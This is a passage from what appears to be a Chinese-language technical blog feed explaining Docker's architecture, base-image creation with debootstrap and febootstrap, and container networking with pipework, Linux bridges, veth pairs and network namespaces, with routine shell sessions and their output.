<h1 id="功能模块"><a href="#功能模块" class="headerlink" title="功能模块"></a>功能模块</h1><h2 id="Docker-Client"><a href="#Docker-Client" class="headerlink" title="Docker Client"></a>Docker Client</h2><p>Docker Client可以通过以下三种方式和Docker Daemon建立通信：tcp:&#x2F;&#x2F;host:port，unix:&#x2F;&#x2F;path_to_socket和fd:&#x2F;&#x2F;socketfd。Docker Client可以通过设置命令行flag参数的形式设置安全传输层协议(TLS)的有关参数，保证传输的安全性。<br>Docker Client发送容器管理请求后，由Docker Daemon接受并处理请求，当Docker Client接收到返回的请求相应并简单处理后，Docker Client一次完整的生命周期就结束了。当需要继续发送容器管理请求时，用户必须再次通过docker可执行文件创建Docker Client。</p>
<h2 id="Docker-Daemon"><a href="#Docker-Daemon" class="headerlink" title="Docker Daemon"></a>Docker Daemon</h2><p>接受并处理Docker Client发送的请求。该守护进程在后台启动了一个Server，Server负责接受Docker Client发送的请求；接受请求后，Server通过路由与分发调度，找到相应的Handler来执行请求。</p>
<p><img src="/images/docker/docker-frame-daemon-main.jpg" alt="docker-frame-daemon-main"><br>Docker Daemon的大致可以分为三部分：Docker Server、Engine和Job。</p>
<ul>
<li><p>Docker Server<br>  专门服务于Docker Client的server。接受并调度分发Docker Client发送的请求。<br>  <img src="/images/docker/docker-frame-daemon-server.jpg" alt="docker-frame-daemon-server"><br>  通过包gorilla&#x2F;mux，创建了一个mux.Router，提供请求的路由功能。在Golang中，gorilla&#x2F;mux是一个强大的URL路由器以及调度分发器。该mux.Router中添加了众多的路由项，每一个路由项由HTTP请求方法（PUT、POST、GET或DELETE）、URL、Handler三部分组成。</p>
</li>
<li><p>Docker Engine<br>  Engine是Docker架构中的运行引擎，同时也Docker运行的核心模块。</p>
</li>
<li><p>Docker Job<br>  一个Job可以认为是Docker架构中Engine内部最基本的工作执行单元。Docker可以做的每一项工作，都可以抽象为一个job。</p>
</li>
</ul>
<h2 id="Docker-Registry"><a href="#Docker-Registry" class="headerlink" title="Docker Registry"></a>Docker Registry</h2><p>是一个存储容器镜像的仓库。而容器镜像是在容器被创建时，被加载用来初始化容器的文件架构与目录。<br>在Docker的运行过程中，Docker Daemon会与Docker Registry通信，并实现搜索镜像、下载镜像、上传镜像三个功能，这三个功能对应的job名称分别为”search”，”pull” 与 “push”。</p>
<h2 id="Graph"><a href="#Graph" class="headerlink" title="Graph"></a>Graph</h2><p>已下载容器镜像的保管者，以及已下载容器镜像之间关系的记录者。一方面，Graph存储着本地具有版本信息的文件系统镜像，另一方面也通过GraphDB记录着所有文件系统镜像彼此之间的关系。</p>
<p><img src="/images/docker/docker-frame-graph-main.jpg" alt="docker-frame-graph-main"></p>
<ul>
<li>GraphDB<br>  一个构建在SQLite之上的小型图数据库，实现了节点的命名以及节点之间关联关系的记录。它仅仅实现了大多数图数据库所拥有的一个小的子集，但是提供了简单的接口表示节点之间的关系。</li>
<li>Repository<br>  关于每一个的容器镜像，具体存储的信息有：该容器镜像的元数据，容器镜像的大小信息，以及该容器镜像所代表的具体rootfs。</li>
</ul>
<h2 id="Driver"><a href="#Driver" class="headerlink" title="Driver"></a>Driver</h2><p>通过Driver驱动，Docker可以实现对Docker容器执行环境的定制。由于Docker运行的生命周期中，并非用户所有的操作都是针对Docker容器的管理，另外还有关于Docker运行信息的获取，Graph的存储与记录等。因此，为了将Docker容器的管理从Docker Daemon内部业务逻辑中区分开来，设计了Driver层驱动来接管所有这部分请求。<br>在Docker Driver的实现中，可以分为以下三类驱动：graphdriver、networkdriver和execdriver。</p>
<h3 id="graphdriver"><a href="#graphdriver" class="headerlink" title="graphdriver"></a>graphdriver</h3><p>graphdriver主要用于完成容器镜像的管理，包括存储与获取。即当用户需要下载指定的容器镜像时，graphdriver将容器镜像存储在本地的指定目录；同时当用户需要使用指定的容器镜像来创建容器的rootfs时，graphdriver从本地镜像存储目录中获取指定的容器镜像。</p>
<p><img src="/images/docker/docker-frame-graphdriver-main.jpg" alt="docker-frame-graphdriver-main"></p>
<p>在graphdriver的初始化过程之前，有4种文件系统或类文件系统在其内部注册，它们分别是aufs、btrfs、vfs和devmapper。而Docker在初始化之时，通过获取系统环境变量”DOCKER_DRIVER”来提取所使用driver的指定类型。而之后所有的graph操作，都使用该driver来执行。</p>
<h3 id="networkdriver"><a href="#networkdriver" class="headerlink" title="networkdriver"></a>networkdriver</h3><p>networkdriver的用途是完成Docker容器网络环境的配置，其中包括Docker启动时为Docker环境创建网桥；Docker容器创建时为其创建专属虚拟网卡设备；以及为Docker容器分配IP、端口并与宿主机做端口映射，设置容器防火墙策略等。</p>
<p><img src="/images/docker/docker-frame-networkdriver-main.jpg" alt="docker-frame-networkdriver-main"></p>
<h3 id="execdriver"><a href="#execdriver" class="headerlink" title="execdriver"></a>execdriver</h3><p>execdriver作为Docker容器的执行驱动，负责创建容器运行命名空间，负责容器资源使用的统计与限制，负责容器内部进程的真正运行等。在execdriver的实现过程中，原先可以使用LXC驱动调用LXC的接口，来操纵容器的配置以及生命周期，而现在execdriver默认使用native驱动，不依赖于LXC。具体体现在Daemon启动过程中加载的ExecDriverflag参数，该参数在配置文件已经被设为”native”。</p>
<p><img src="/images/docker/docker-frame-execdriver-main.jpg" alt="docker-frame-execdriver-main"></p>
<h2 id="libcontainer"><a href="#libcontainer" class="headerlink" title="libcontainer"></a>libcontainer</h2><p>bcontainer是Docker架构中一个使用Go语言设计实现的库，设计初衷是希望该库可以不依靠任何依赖，直接访问内核中与容器相关的API。正是由于libcontainer的存在，Docker可以直接调用libcontainer，而最终操纵容器的namespace、cgroups、apparmor、网络设备以及防火墙规则等。这一系列操作的完成都不需要依赖LXC或者其他包。</p>
<p><img src="/images/docker/docker-frame-libcontainer-main.jpg" alt="docker-frame-libcontainer-main"></p>
<h2 id="Docker-container"><a href="#Docker-container" class="headerlink" title="Docker container"></a>Docker container</h2><p>Todo…</p>
<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><h2 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h2><p><img src="/images/docker/docker-flow-pull.jpg" alt="docker-flow-pull"></p>
<h2 id="docker-run"><a href="#docker-run" class="headerlink" title="docker run"></a>docker run</h2><p><img src="/images/docker/docker-flow-run.jpg" alt="docker-flow-run"></p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.infoq.com/cn/articles/docker-source-code-analysis-part1/">Docker源码分析（一）：Docker架构</a></li>
</ul>
]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker Base Image制作</title>
    <url>/2017/01/04/container/docker/docker-mk-base-image/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>docker容器的创建依赖于镜像，镜像的创建依赖于目录树，不同的linux发行版，有自己的目录树。本文主要介绍debian族发行版与fedora族发行版base image的创建。如果您想从零创建一个linux发行版base image，请参考LFS（linux from scratch）。</p>
<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ul>
<li>OS Version, RHEL7.2</li>
<li>docker Version, 1.12.5</li>
</ul>
<h1 id="debian"><a href="#debian" class="headerlink" title="debian"></a>debian</h1><p>debian类的操作系统包括debian、ubuntu，这一类操作系统的目录树都是用<code>debootstrap</code>来生成的。其中<code>de</code>取debian之意。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>可直接使用yum安装<code>yum install debootstrap</code>。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>debian默认的mirror为<a href="https://deb.debian.org/debian/">https://deb.debian.org/debian/</a></p>
<p>debootstrap格式:<br><code>debootstrap [OPTION...] &lt;版本&gt; &lt;目录树存放位置目录&gt; [&lt;镜像（mirror）位置&gt;]</code></p>
<p>eg: <code>sudo debootstrap jessie my_jessie</code></p>
<h1 id="fedora"><a href="#fedora" class="headerlink" title="fedora"></a>fedora</h1><p>fedora类的操作系统包括fedora、RHEL、CentOS，这一类操作系统的目录树都是用<code>febootstrap</code>来生成的。其中<code>fe</code>取fedora之意。</p>
<h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><p><code>febootstrap</code>并没有存在于RHEL7.2（或CentOS7.2）Repo中，目前可以直接安装6.8 repo中的<code>febootstrap-3.21-4</code>。</p>
<p>febootstrap-3.21-4依赖包如下所示：</p>
<ul>
<li>fakechroot-2.9-24.5.el6_1.1.x86_64</li>
<li>fakechroot-libs-2.9-24.5.el6_1.1.x86_64</li>
<li>fakeroot-1.12.2-22.2.el6.x86_64</li>
<li>fakeroot-libs-1.12.2-22.2.el6.x86_64</li>
<li>febootstrap-supermin-helper-3.21-4.el6.x86_64</li>
</ul>
<h2 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h2><p>febootstrap格式:<br><code>febootstrap [OPTION...] &lt;版本&gt; &lt;目录树存放位置目录&gt; [镜像（mirror）位置]</code></p>
<p>eg: <code>febootstrap -i bash 6.8 my_centos6.8 http://mirrors.163.com/centos/6.8/os/x86_64/</code></p>
<h1 id="LFS"><a href="#LFS" class="headerlink" title="LFS"></a>LFS</h1><p>Todo…</p>
<h1 id="镜像导入"><a href="#镜像导入" class="headerlink" title="镜像导入"></a>镜像导入</h1><h2 id="Tar导入方式创建镜像"><a href="#Tar导入方式创建镜像" class="headerlink" title="Tar导入方式创建镜像"></a>Tar导入方式创建镜像</h2><p>无论是debootstrap还是febootstrap生成的目录，其导入docker image的方法是一样的。</p>
<p>格式:<br><code>tar -C &lt;目录树目录&gt; -c . | docker import - &lt;docker image 名称&gt;</code></p>
<p>eg: <code>tar -C ./my_jessie -c . | docker import - my_jessie_base</code></p>
<h2 id="空镜像创建"><a href="#空镜像创建" class="headerlink" title="空镜像创建"></a>空镜像创建</h2><p>格式:<br><code>tar cv --files-from /dev/null | docker import - &lt;docker image 名称&gt;</code></p>
<p>eg: <code>tar cv --files-from /dev/null | docker import - empty_image</code></p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://linux.cn/article-5427-1.html">两种方式创建你自己的 Docker 基本映像</a></li>
<li><a href="http://www.latelee.org/using-gnu-linux/ubuntu-debootstrap.html">ubuntu系统debootstrap的使用</a></li>
<li><a href="https://my.oschina.net/ylchou/blog/490412">CentOS下febootstrap自制Docker的CentOS6.6和7.1 Docker镜像</a></li>
</ul>
]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>image</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker网络管理——PIPEWORK</title>
    <url>/2017/05/08/container/docker/docker-network-pipework/</url>
    <content><![CDATA[<p>PIPEWORK 是一个简单易用的Docker容器网络配置工具，由Docker的工程师Jérôme Petazzoni开发。通过使用ip、brctl、ovs-vsctl等命令来为Docker容器配置自定义的网桥、网卡、路由等。</p>
<p><img src="/images/docker/docker-network-pipework-frame.png" alt="docker-network-pipework-frame.png"></p>
<ul>
<li>使用新建的br0网桥替代默认的docker0网桥</li>
<li>容器网络类型选择<code>none</code></li>
</ul>
<h1 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h1><ol>
<li>在Github上获取pipework<br> Todo</li>
<li>创建网桥 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> brctl addbr br0</span></span><br></pre></td></tr></table></figure></li>
<li>连接宿主机网卡 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> brctl addif eth1</span></span><br></pre></td></tr></table></figure></li>
<li>设置网桥ip，并激活网桥 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip addr add 192.168.6.66/24 dev br0</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip <span class="built_in">link</span> <span class="built_in">set</span> dev br0 up</span></span><br></pre></td></tr></table></figure></li>
<li>创建容器，网络类型指定为<code>none</code> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -it --<span class="built_in">rm</span> --net none --name nonenet_1 192.168.6.109:5000/my_ubuntu:v1 /bin/bash</span></span><br></pre></td></tr></table></figure></li>
<li>使用PIPEWORK创建容器网络 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ./pipework br0 nonenet_1 192.168.6.67/24@192.168.6.1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">brctl show</span></span><br><span class="line">bridge name     bridge id               STP enabled     interfaces</span><br><span class="line">br0             8000.8ef4503cf344       no              eth1</span><br><span class="line">                                                        veth1pl7289</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="鸣谢-参考"><a href="#鸣谢-参考" class="headerlink" title="鸣谢&amp;参考"></a>鸣谢&amp;参考</h1><ul>
<li><a href="http://www.cnblogs.com/yy-cxd/p/6553624.html">一分钟看懂Docker的网络模式和跨主机通信</a></li>
<li><a href="http://www.infoq.com/cn/articles/docker-network-and-pipework-open-source-explanation-practice/">Docker网络详解及pipework源码解读与实践</a></li>
<li><a href="http://blog.csdn.net/reedchi/article/details/51670265">使用pipework理解容器间网络</a></li>
<li><a href="http://blog.csdn.net/design321/article/details/48264825">用PIPEWORK为docker容器配置独立IP</a></li>
</ul>
]]></content>
      <categories>
        <category>container</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker网络技术(Bridge)</title>
    <url>/2017/03/03/container/docker/docker-network/</url>
    <content><![CDATA[<p>Docker网络技术，用来保证Container之间正常通讯的技术，作为Docker自身提供的网络分为4种，Bridge、Host、None、Container。本文重点介绍** Bridge **</p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>Docker 版本<br>  Docker version 1.12.5, build 7392c3b</li>
<li>OS 版本<br>  Red Hat Enterprise Linux Server release 7.2 (Maipo)</li>
<li>kernel 版本<br>  Linux 3.10.0-327.el7.x86_64</li>
</ul>
<h1 id="Bridge介绍"><a href="#Bridge介绍" class="headerlink" title="Bridge介绍"></a>Bridge介绍</h1><h2 id="longlong-ago"><a href="#longlong-ago" class="headerlink" title="longlong ago :-)"></a>longlong ago :-)</h2><p><img src="/images/docker/docker-network-bridge-br0.png" alt="docker-network-bridge-br0"></p>
<p>早期的二层网络中，bridge可以连接不同的LAN网，当host1 发出一个数据包时，LAN1的其他主机和网桥br0都会收到该数据包。网桥再将数据包从入口端广播到其他端口上（我的理解是，多端口网桥叫交换机）。因此，LAN2上的主机也会接收到host1发出的数据包，从而实现不同LAN网上所有主机的通信。</p>
<p><img src="/images/docker/docker-network-bridge-linux.png" alt="docker-network-bridge-linux"></p>
<p>后来linux kernel借鉴桥设备的原理实现了虚拟bridge，用到了veth pair技术，实现了不同子网通讯的二层基础。</p>
<h2 id="Docker-Bridge"><a href="#Docker-Bridge" class="headerlink" title="Docker Bridge"></a>Docker Bridge</h2><p>(正题)<code>Docker Bridge</code>不同于<code>linux bridge</code>也不同于<code>桥设备</code>，但<code>Docker Bridge</code>的构建基于<code>linux bridge</code>、<code>Network Namespace</code>、<code>iptables</code>。</p>
<ul>
<li>Network Namespace<br>  实现了子网之间的隔离</li>
<li>iptables<br>  解决了NAT映射问题，使容器有(被)访问外网的能力。</li>
<li>linux bridge<br>  实现了Host内跨子网通讯</li>
</ul>
<p><img src="/images/docker/docker-network-bridge-main.png" alt="docker-network-bridge-main"></p>
<p>在桥接模式下，Docker Daemon将veth0附加到docker0网桥上，保证宿主机的报文有能力发往veth0。再将veth1添加到Docker容器所属的网络命名空间，保证宿主机的网络报文若发往veth0可以立即被veth1收到。容器如果需要联网，则需要采用NAT方式。准确的说，是NATP(网络地址端口转换)方式。NATP包含两种转换方式：SNAT和DNAT。</p>
<h3 id="下行访问流程"><a href="#下行访问流程" class="headerlink" title="下行访问流程"></a>下行访问流程</h3><p><img src="/images/docker/docker-network-bridge-downflow.png" alt="docker-network-bridge-downflow"><br>由于容器的IP与端口对外都是不可见的，所以数据包的目的地址为宿主机的ip和端口，为192.168.1.10:24。<br>数据包经过路由器发给宿主机eth0，再经eth0转发给docker0网桥。<br>由于存在DNAT(Destination NAT，修改数据包的目的地址)规则，会将数据包的目的地址转换为容器的ip和端口，为172.17.0.n:24。宿主机上的docker0网桥识别到容器ip和端口，于是将数据包发送附加到docker0网桥上的veth0接口，veth0接口再将数据包发送给容器内部的veth1接口，容器接收数据包并作出响应。<br><img src="/images/docker/docker-network-bridge-downflow-detail.png" alt="docker-network-bridge-downflow-detail"></p>
<h3 id="上行访问流程"><a href="#上行访问流程" class="headerlink" title="上行访问流程"></a>上行访问流程</h3><p>看了上面的<code>下行访问流程</code>用到了DNAT，那么上行访问一定会使用SNAT了吧。可实时却并非如此。<br>容器内的请求可以正常发送到host外，是因为host开启的<code>ip_forward</code>。如果host关闭转发功能<code>echo 0 &gt; /proc/sys/net/ipv4/ip_forward</code>，容器能的请求只能发送到于自己相同网段的节点容器内，不同网段及跨主机的网段是不通的。<br><img src="/images/docker/docker-network-bridge-upflow-detail.png" alt="docker-network-bridge-upflow-detail"></p>
<h1 id="Docker-bridge中关键技术"><a href="#Docker-bridge中关键技术" class="headerlink" title="Docker bridge中关键技术"></a>Docker bridge中关键技术</h1><p>Docker bridge充分利用了linux bridge和iptabels、namespace等技术。将其中需要很多命令做成自动化脚本以方便执行维护。如：pipework是一个shell脚本，用于完成bridge网络管理。</p>
<h2 id="veth-pair"><a href="#veth-pair" class="headerlink" title="veth pair"></a>veth pair</h2><p>veth pair是一对虚拟网卡，从一张veth网卡发出的数据包可以直接到达它的peer veth,两者之间存在着虚拟链路。veth网卡和常规的以太网区别仅在于xmit接口：将数据发送到其peer,触发peer的Rx 过程。<br><img src="/images/docker/docker-network-bridge-vethpair.png" alt="docker-network-bridge-vethpair"><br>veth pair是用于不同network namespace间进行通信的方式，veth pair将一个network namespace数据发往另一个network namespace的veth。如果多个network namespace需要进行通信，则需要借助bridge。</p>
<p>*** 属于iproute2工具包中的ip-link提供的功能 ***</p>
<p>创建veth pair，vp16与vp19是一对儿，vp26与vp29是一对儿。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip <span class="built_in">link</span> add vp16 <span class="built_in">type</span> veth peer name vp19</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip <span class="built_in">link</span> add vp26 <span class="built_in">type</span> veth peer name vp29</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip <span class="built_in">link</span> show</span></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">2: enp0s5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether 00:1c:42:c6:de:63 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">3: vp19@vp16: &lt;BROADCAST,MULTICAST,M-DOWN&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether b6:62:99:1e:0c:2a brd ff:ff:ff:ff:ff:ff</span><br><span class="line">4: vp16@vp19: &lt;BROADCAST,MULTICAST,M-DOWN&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether 1e:ea:cf:86:51:ab brd ff:ff:ff:ff:ff:ff</span><br><span class="line">5: vp29@vp26: &lt;BROADCAST,MULTICAST,M-DOWN&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether 4e:16:07:e6:77:2c brd ff:ff:ff:ff:ff:ff</span><br><span class="line">6: vp26@vp29: &lt;BROADCAST,MULTICAST,M-DOWN&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether be:98:08:90:da:7a brd ff:ff:ff:ff:ff:ff</span><br></pre></td></tr></table></figure>

<p>创建namespace ns19和ns29，并设置vp19和vp29的netns</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns add ns19</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns add ns29</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns list</span></span><br><span class="line">ns19</span><br><span class="line">ns29</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip <span class="built_in">link</span> <span class="built_in">set</span> netns ns19 vp19</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip <span class="built_in">link</span> <span class="built_in">set</span> netns ns29 vp29</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip <span class="built_in">link</span> show</span></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">2: enp0s5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether 00:1c:42:c6:de:63 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">4: vp16@if3: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether 1e:ea:cf:86:51:ab brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">6: vp26@if5: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether be:98:08:90:da:7a brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br></pre></td></tr></table></figure>
<p>设置完netns后，在当前namespace中查看网卡信息就看不到vp19和vp29这两个网卡了，但在ns19和ns29 namespace中却能查看到对应的网卡。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns19 ip <span class="built_in">link</span> show</span></span><br><span class="line">1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN mode DEFAULT group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">3: vp19@if4: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether b6:62:99:1e:0c:2a brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns29 ip <span class="built_in">link</span> show</span></span><br><span class="line">1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN mode DEFAULT group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">5: vp29@if6: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether 4e:16:07:e6:77:2c brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br></pre></td></tr></table></figure>
<p>此时将这四个网卡激活，并配置ip，他们便可以相互通讯了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip <span class="built_in">link</span> <span class="built_in">set</span> dev vp16 up</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip <span class="built_in">link</span> <span class="built_in">set</span> dev vp26 up</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns19 ip <span class="built_in">link</span> <span class="built_in">set</span> dev vp19 up</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns29 ip <span class="built_in">link</span> <span class="built_in">set</span> dev vp29 up</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip addr add 192.168.200.16/24 dev vp16</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip addr add 192.168.200.26/24 dev vp26</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip addr show</span></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line">2: enp0s5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:1c:42:c6:de:63 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.3.5/24 brd 192.168.3.255 scope global enp0s5</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::21c:42ff:fec6:de63/64 scope link</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line">4: vp16@if3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    link/ether 1e:ea:cf:86:51:ab brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 192.168.200.16/24 scope global vp16</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::1cea:cfff:fe86:51ab/64 scope link</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line">6: vp26@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    link/ether be:98:08:90:da:7a brd ff:ff:ff:ff:ff:ff link-netnsid 1</span><br><span class="line">    inet 192.168.200.26/24 scope global vp26</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::bc98:8ff:fe90:da7a/64 scope link</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns19 ip addr add 192.168.200.19/24 dev vp19</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns19 ip addr show</span></span><br><span class="line">1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">3: vp19@if4: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    link/ether b6:62:99:1e:0c:2a brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 192.168.200.19/24 scope global vp19</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::b462:99ff:fe1e:c2a/64 scope link</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns29 ip addr add 192.168.200.29/24 dev vp29</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> ip netns <span class="built_in">exec</span> ns29 ip addr show</span></span><br><span class="line">1: lo: &lt;LOOPBACK&gt; mtu 65536 qdisc noop state DOWN group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">5: vp29@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000</span><br><span class="line">    link/ether 4e:16:07:e6:77:2c brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 192.168.200.29/24 scope global vp29</span><br><span class="line">        valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::4c16:7ff:fee6:772c/64 scope link</span><br><span class="line">        valid_lft forever 